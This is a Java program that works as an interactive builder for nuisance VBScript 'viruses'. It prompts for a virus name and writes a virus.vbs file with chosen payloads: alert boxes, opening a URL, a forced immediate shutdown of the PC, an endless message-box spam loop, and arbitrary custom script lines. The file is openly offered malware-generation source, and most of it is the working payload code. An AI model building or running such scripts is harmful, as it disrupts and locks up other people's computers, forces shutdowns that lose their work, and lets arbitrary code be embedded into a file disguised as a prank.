package VBSlanguages;

import java.io.*;
import java.util.Scanner;

public class VBenglish {

    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";


    public static void mostrarOpciones()
    {
        System.out.println("1- Open other alert");
        System.out.println("2- Open Website");
        System.out.println("3- Shutdown PC");
        System.out.println("4- Custom Script");
        System.out.println("5- Spam Message");
        System.out.println("6- End Virus");
    }

    public static void vbsEnglish() {
        Scanner scanner = new Scanner(System.in);
        System.out.print(ANSI_WHITE + "Now say me your virus name: ");
        String nombreVirus = scanner.nextLine();
        System.out.println("So, the virus name is: " + nombreVirus);

        File virus = new File("virus.vbs");
        try {
            PrintWriter salidaVirus = new PrintWriter(new FileWriter(virus, true));
            salidaVirus.println("msgbox(\"" + "You have been infected by the virus: " + nombreVirus + "\")");
            System.out.println("Now select what you want your virus to do: ");

            for (int i = 0; i <= 1000; i++) {
                int option;
                mostrarOpciones();
                option = Integer.parseInt(scanner.nextLine());

                //ACCIONES
                if (option == 1)
                {
                    String mensajeOtraAlerta;
                    System.out.println("Now tell me what message you want to appear: ");
                    mensajeOtraAlerta = scanner.nextLine();
                    salidaVirus.println("msgbox(\"" + mensajeOtraAlerta + "\")");
                }
                else if (option == 2)
                {
                    String redirectURL;
                    System.out.println("Now tell me what URL you want the virus to redirect: ");
                    redirectURL = scanner.nextLine();
                    salidaVirus.println("Dim wShell");
                    salidaVirus.println("Set wShell = CreateObject(\"WScript.Shell\")");
                    salidaVirus.println("wShell.Run \"" + redirectURL + "\"" + ",9");
                }
                else if (option == 3)
                {
                    salidaVirus.println("\' -s = shutdown, -t 0 = no timeout, -f = force programs to close");
                    salidaVirus.println("strShutdown = \"shutdown.exe -s -t 0 -f -m \\\" & strComputer");
                    salidaVirus.println("set objShell = CreateObject(\"WScript.Shell\")");
                    salidaVirus.println("objShell.Run strShutdown, 0, false");
                }
                else if (option == 4)
                {
                    String scriptPersonalizado;
                    System.out.println("Write the custom script: ");
                    System.out.println("NOTE: I am developing a way to make a multiline script, please wait...");
                    System.out.println("For now to do that you have to select the custom script option more than once to make a multiline script");
                    scriptPersonalizado = scanner.nextLine();
                    salidaVirus.println(scriptPersonalizado);
                }
                else if (option == 5)
                {
                    String mensajeSpam;
                    System.out.println("Tell me what message you want the program to spam: ");
                    mensajeSpam = scanner.nextLine();
                    salidaVirus.println("do" + "\n" + "x=MsgBox(\"" + mensajeSpam + "\"," + "vbOkOnly+vbCritical," + "\"" + mensajeSpam + "\"" + ")" + "\n" + "loop");
                }
                else if (option == 6)
                {
                    System.out.println("BYE!");
                    salidaVirus.close();
                    break;
                }
                else {
                    System.out.println(ANSI_RED + "ERROR 4.");
                }
                i++;
            }
        } catch (Exception e) {
            System.out.println(ANSI_RED + "ERROR 2.");
        }
    }
}
